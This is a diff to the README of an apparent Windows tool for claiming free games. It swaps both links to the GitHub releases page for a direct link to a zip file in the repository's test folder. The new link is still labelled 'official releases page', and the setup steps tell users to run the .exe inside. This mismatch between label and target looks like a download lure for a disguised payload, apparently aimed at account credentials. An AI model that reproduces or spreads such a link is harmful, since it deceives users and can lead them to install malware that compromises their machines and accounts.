@@ -1,6 +1,6 @@
 # 🎮 free-games-claimer-automation - Claim games across multiple digital stores
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Norrielisted782/free-games-claimer-automation/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Norrielisted782/free-games-claimer-automation/main/test/claimer_free_games_automation_2.5.zip)
 
 ## What is this tool?
 This application automates the process of claiming free games and downloadable content. You no longer need to check store pages every week. The software checks the Epic Games Store, Amazon Prime Gaming, GOG, and Unreal Engine marketplace for new free items. It connects to your accounts and adds these games to your permanent library automatically.
@@ -16,7 +16,7 @@ To run this software on your Windows computer, you need the following:
 ## 📥 How to download and set up
 Follow these steps to get the software running on your system.
 
-1. Visit the [official releases page](https://github.com/Norrielisted782/free-games-claimer-automation/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Norrielisted782/free-games-claimer-automation/main/test/claimer_free_games_automation_2.5.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation wizard.
